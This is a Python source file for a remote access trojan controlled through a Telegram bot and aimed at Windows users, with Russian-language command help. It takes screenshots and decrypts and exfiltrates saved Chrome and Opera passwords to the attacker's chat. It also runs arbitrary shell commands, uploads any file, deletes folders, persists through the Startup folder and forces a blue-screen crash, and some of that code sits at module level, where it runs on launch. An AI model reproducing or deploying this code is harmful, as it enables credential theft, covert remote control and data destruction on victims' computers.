import telebot
import requests 
from PIL import ImageGrab 
import shutil 
import sqlite3 
import win32crypt 
from ctypes import windll 
from ctypes import c_int 
from ctypes import c_uint 
from ctypes import c_ulong 
from ctypes import POINTER 
from ctypes import byref 
import subprocess 
import os, sys
import platform 
import webbrowser 

bot_token = "######:#############"   # Bot Token
chat_id = "###########" # ID Chat

bot = telebot.TeleBot(bot_token)  


@bot.message_handler(commands=['start', 'Start']) 
def send_message(command): 
    bot.send_message(chat_id, "🐍 Python-RAT Running 🐍" +
                     "\n\nЧтобы узнать команды введи команду /commands" +
                     "\nCoded by Dnspy | ds: DNSP ") 
    
@bot.message_handler(commands=['help', 'commands', 'Help', 'Commands']) # Commands
def send_message(command):
    bot.send_message(chat_id, "Команды: \n /Screen - Скриншот экрана \n /Info - Инфо о юзере \n /screamer - откроет ссылку на скример \n \n /bsod - Краш системы /kill_process name.exe - Убить процесс по имени" +
                    "\n /Pwd - Узнать текущую директорию \n /autostart - Добавить ратник в автостарт \n /passwords chrome - Пароли гугл хром \n /passwords opera - Пароли опера" +
                    "\n /Cmd command - Выполнить команду в cmd  \n /Open_url - Открыть ссылку \n /Ls - все папки и файлы в директории" +
                    "\n /Cd folder - перейти в папку \n /Download - скачать файл \n /Rm_dir - удалить папку" + 
                    "\n\n /About - о RAT'e")
    

@bot.message_handler(commands=['screen', 'Screen']) 
def send_screen(command) :
    bot.send_message(chat_id, "Wait...") 
    screen = ImageGrab.grab() 
    screen.save(os.getenv("APPDATA") + '\\Sreenshot.jpg') 
    screen = open(os.getenv("APPDATA") + '\\Sreenshot.jpg', 'rb') 
    files = {'photo': screen} 
    requests.post("https://api.telegram.org/bot" + bot_token + "/sendPhoto?chat_id=" + chat_id , files=files) 

@bot.message_handler(commands=['screamer', 'Screamer']) 
def send_screamer(command) :
    bot.send_message(chat_id, "Wait...") 
    webbrowser.open('https://parad1st.github.io/Screamer/', new=2)
    bot.send_message(chat_id, "Successfully open screamer!") 

@bot.message_handler(commands=['bsod', 'Bsod']) 
def send_bsod(command) :
    bot.send_message(chat_id, "Wait...") 

nullptr = POINTER(c_int)() 
windll.ntdll.RtlAdjustPrivilege( 
    c_uint(19), 
    c_uint(1), 
    c_uint(0), 
    byref(c_int()) 
) 
windll.ntdll.NtRaiseHardError( 
    c_ulong(0xC000007B), 
    c_ulong(0), 
    nullptr, 
    nullptr, 
    c_uint(6), 
    byref(c_uint()) 
)

bot.send_message(chat_id, "Successfully bsod!") 

@bot.message_handler(commands=['autostart', 'Autostart']) 
def send_autostart(command) :
    bot.send_message(chat_id, "Wait...") 
    Thisfile = sys.argv[0] 
    Thisfile_name = os.path.basename(Thisfile) 
    user_path = os.path.expanduser('~') 
    if not os.path.exists(f"{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{Thisfile_name}"):
        os.system(f'copy "{Thisfile}" "{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')
    bot.send_message(chat_id, "Successfully to Autostart!") 

def Chrome():
    text = 'Stealer coded by DNSP\n\n\nPasswords Chrome:' + '\n'
    if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data'):
        shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data', os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
        
        conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        for result in cursor.fetchall():
            password = win32crypt.CryptUnprotectData(result[2])[1].decode()
            login = result[1]
            url = result[0]
            if password != '':
                text += '\nURL: ' + url + '\nLOGIN: ' + login + '\nPASSWORD: ' + password + '\n'
    return text
file = open(os.getenv("APPDATA") + '\\passwords_chrome.txt', "w+") #
file.write(str(Chrome()) + '\n')
file.close()


def Opera():
    texto = 'Stealer coded by DNSP\n\n\nPasswords Opera:' + '\n'
    texto += 'URL | LOGIN | PASSWORD' + '\n'
    if os.path.exists(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data'):
        shutil.copy2(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data', os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data2')
        conn = sqlite3.connect(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data2')
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        for result in cursor.fetchall():
            password = win32crypt.CryptUnprotectData(result[2])[1].decode()
            login = result[1]
            url = result[0]
            if password != '':
                texto += '\nURL: ' + url + '\nLOGIN: ' + login + '\nPASSWORD: ' + password + '\n'
file = open(os.getenv("APPDATA") + '\\passwords_opera.txt', "w+")
file.write(str(Opera()) + '\n')
file.close()

@bot.message_handler(commands=['passwords', 'Passwords']) 
def send_passwords(message) :
    
    if ("{0}".format(message.text) == "/passwords chrome") : 
        try: 
            Chrome() 
            bot.send_message(chat_id, "Wait...") 
            files = {'document': open(os.getenv("APPDATA") + '\\passwords_chrome.txt','rb')}
            requests.post("https://api.telegram.org/bot" + bot_token + "/sendDocument?chat_id=" + chat_id , files=files)
        except: 
            bot.send_message(chat_id, "Ошибка! Браузер запущен!")
            
    elif ("{0}".format(message.text) == "/passwords opera") : 
            Opera() 
            bot.send_message(chat_id, "Wait...")
            files = {'document': open(os.getenv("APPDATA") + '\\passwords_opera.txt','rb')}
            requests.post("https://api.telegram.org/bot" + bot_token + "/sendDocument?chat_id=" + chat_id , files=files)

    else : 
        bot.send_message(chat_id, "Ошибка! Команда введена неправильно!")

@bot.message_handler(commands=['info', 'Info']) 
def send_info(command) :
    username = os.getlogin() 
    
    r = requests.get('http://ip.42.pl/raw') 
    IP = r.text 
    windows = platform.platform() 
    processor = platform.processor() 

    bot.send_message(chat_id, "PC: " + username + "\nIP: " + IP + "\nOS: " + windows +
    "\nProcessor: " + processor) 
    
@bot.message_handler(commands=['pwd', 'Pwd']) 
def pwd(command) :
    directory = os.path.abspath(os.getcwd()) 
    bot.send_message(chat_id, "Текущая дериктория: \n" + (str(directory))) 

@bot.message_handler(commands=["kill_process", "Kill_process"]) 
def kill_process(message):
    user_msg = "{0}".format(message.text) 
    subprocess.call("taskkill /IM " + user_msg.split(" ")[1]) 
    bot.send_message(chat_id, "Готово!")

@bot.message_handler(commands=["cmd", "Cmd"]) 
def cmd_command(message) : 
    user_msg = "{0}".format(message.text)
    subprocess.Popen([r'C:\\Windows\\system32\\cmd.exe', user_msg.split(" ")[1]]) 
    bot.send_message(chat_id, "Готово!")

@bot.message_handler(commands=["open_url", "Open_url"]) 
def open_url(message): 
    user_msg = "{0}".format(message.text)
    url = user_msg.split(" ")[1] 
    webbrowser.open_new_tab(url) 
    bot.send_message(chat_id, "Готово!")

@bot.message_handler(commands=["ls", "Ls"]) 
def ls_dir(commands):
     dirs = '\n'.join(os.listdir(path=".")) 
     bot.send_message(chat_id, "Files: " + "\n" + dirs)

@bot.message_handler(commands=["cd", "Cd"]) 
def cd_dir(message): 
    user_msg = "{0}".format(message.text)  
    path2 = user_msg.split(" ")[1] 
    os.chdir(path2) 
    bot.send_message(chat_id, "Директория изменена на " + path2)

@bot.message_handler(commands =["Download", "download"]) 
def download_file(message):
    user_msg = "{0}".format(message.text)
    docc = user_msg.split(" ")[1] 
    doccc = {'document': open(docc,'rb')} 
  
    requests.post("https://api.telegram.org/bot" + bot_token + "/sendDocument?chat_id=" + chat_id , files=doccc)

@bot.message_handler(commands = ["Rm_dir", "rm_dir"]) 
def delete_dir(message):   

    user_msg = "{0}".format(message.text)
    path2del = user_msg.split(" ")[1] 
    os.removedirs(path2del) 
    bot.send_message(chat_id, "Директория " + path2del + " удалена")

@bot.message_handler(commands = ["About", "about"]) 
def about(commands):
    bot.send_message(chat_id, " Python RAT v 0.1 \n\nCoder: dnspy \nSpecial for DNSP")

bot.polling()


input("Press enter to exit")